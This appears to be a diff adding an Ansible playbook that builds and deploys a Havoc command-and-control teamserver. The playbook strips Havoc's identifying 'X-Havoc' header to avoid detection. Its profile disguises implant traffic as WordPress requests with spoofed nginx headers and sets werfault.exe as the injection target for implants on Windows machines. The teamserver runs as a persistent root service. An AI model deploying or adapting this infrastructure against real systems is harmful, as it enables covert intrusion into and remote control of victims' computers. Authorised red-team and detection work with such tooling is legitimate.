@@ -1,0 +1,197 @@
+---
+- name: Setup Havoc Teamserver
+  hosts: change hostname
+  become: true
+  vars:
+    domain_name: "change your domain"  
+    operator_username: "change username"
+    operator_password: "change password"
+
+  tasks:
+    - name: Install required packages
+      apt:
+        name:
+          - git
+          - build-essential
+          - apt-utils
+          - cmake
+          - libfontconfig1
+          - libglu1-mesa-dev
+          - libgtest-dev
+          - libspdlog-dev
+          - libboost-all-dev
+          - libncurses5-dev
+          - libgdbm-dev
+          - libssl-dev
+          - libreadline-dev
+          - libffi-dev
+          - libsqlite3-dev
+          - libbz2-dev
+          - mesa-common-dev
+          - qtbase5-dev
+          - qtchooser
+          - qt5-qmake
+          - qtbase5-dev-tools
+          - libqt5websockets5
+          - libqt5websockets5-dev
+          - qtdeclarative5-dev
+          - golang-go
+          - qtbase5-dev
+          - libqt5websockets5-dev
+          - python3-dev
+          - libboost-all-dev
+          - mingw-w64
+          - nasm
+          - apache2
+          - certbot
+          - python3-certbot-apache
+        state: present
+        update_cache: yes
+
+    - name: Check if Havoc is already installed
+      stat:
+        path: /opt/Havoc/havoc
+      register: havoc_installed
+
+    - name: Clone Havoc repository
+      git:
+        repo: 'https://github.com/HavocFramework/Havoc'
+        dest: '/opt/Havoc'
+        update: yes
+        key_file: "{{ ansible_ssh_private_key_file }}"
+      when: not havoc_installed.stat.exists
+
+    - name: Remove specific line from http.go
+      lineinfile:
+        path: /opt/Havoc/teamserver/pkg/handlers/http.go
+        state: absent
+        regexp: 'ctx\.Header\("X-Havoc", "true"\)'
+      when: not havoc_installed.stat.exists
+
+    - name: Download Go modules
+      command: go mod download
+      args:
+        chdir: /opt/Havoc/teamserver
+      environment:
+        GOPATH: "/opt/Havoc"
+      when: not havoc_installed.stat.exists
+
+    - name: Build Havoc teamserver
+      command: make ts-build
+      args:
+        chdir: /opt/Havoc
+      when: not havoc_installed.stat.exists
+
+    - name: Obtain SSL certificate using Certbot
+      command: certbot certonly --non-interactive --quiet --register-unsafely-without-email --agree-tos -a webroot --webroot-path=/var/www/html -d "{{ domain_name }}"
+      when: domain_name is defined
+
+    - name: Create Havoc configuration file
+      copy:
+        dest: /opt/Havoc/profiles/havoc.yaotl
+        content: |
+          Teamserver {
+              Host = "0.0.0.0"
+              Port = 40056
+
+              Build {
+                  Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
+                  Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
+                  Nasm = "/usr/bin/nasm"
+              }
+          }
+
+          Operators {
+              user "{{ operator_username }}" {
+                  Password = "{{ operator_password }}"
+              }
+          }
+
+          Demon {
+              Sleep = 2
+              Jitter = 15
+
+              TrustXForwardedFor = true
+
+              Injection {
+                  Spawn64 = "C:\\Windows\\System32\\werfault.exe"
+                  Spawn32 = "C:\\Windows\\SysWOW64\\werfault.exe"
+              }
+          }
+
+          Listeners {
+              Http {
+                  Name         = "Agent Listener - HTTP/s"
+                  Hosts        = [
+                      "{{ domain_name }}"
+                  ]
+                  HostBind     = "0.0.0.0"
+                  PortBind     = 443
+                  PortConn     = 443
+                  HostRotation = "round-robin"
+                  Secure       = true
+                  UserAgent    = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
+
+                  Uris = [
+                      "/wp-content/themes/default/advanced_search?hl=en-GB&fg=",
+                      "/wp-admin/admin.php?page=troubleshooter&id=1631343",
+                      "/wp-admin/admin-ajax.php?action=async_newtab&ei=",
+                      "/wp-admin/js/babel-polyfill/6.3.14/polyfill.min.js",
+                      "/wp-login.php",
+                      "/wp-includes/images/wpspin.gif",
+                      "/wp-includes/js/tinymce/themes/advanced/skins/default/ui.css"
+                  ]
+
+                  Headers = [
+                      "Content-type: text/plain"
+                  ]
+
+                  Cert {
+                      Cert      = "/etc/letsencrypt/live/{{ domain_name }}/cert.pem"
+                      Key       = "/etc/letsencrypt/live/{{ domain_name }}/privkey.pem"
+                  }
+
+                  Response {
+                      Headers = [
+                          "Content-Type: text/html; charset=utf-8",
+                          "X-Frame-Options: DENY",
+                          "Strict-Transport-Security: max-age=1209600",
+                          "Server: nginx",
+                          "Host-header: WordPress.com"
+                      ]
+                  }
+              }
+          }
+
+    - name: Create systemd service file for Havoc
+      copy:
+        dest: /etc/systemd/system/havoc.service
+        content: |
+          [Unit]
+          Description=Havoc Teamserver
+          After=network.target
+
+          [Service]
+          Type=simple
+          User=root
+          WorkingDirectory=/opt/Havoc
+          ExecStart=/opt/Havoc/havoc server --profile profiles/havoc.yaotl -v
+          Restart=on-failure
+          RestartSec=10
+
+          [Install]
+          WantedBy=multi-user.target
+
+    - name: Reload systemd to apply changes
+      command: systemctl daemon-reload
+
+    - name: Enable Havoc service to start on boot
+      systemd:
+        name: havoc
+        enabled: yes
+        state: started
+
+    - name: Start Havoc service
+      systemd:
+        name: havoc
+        state: started
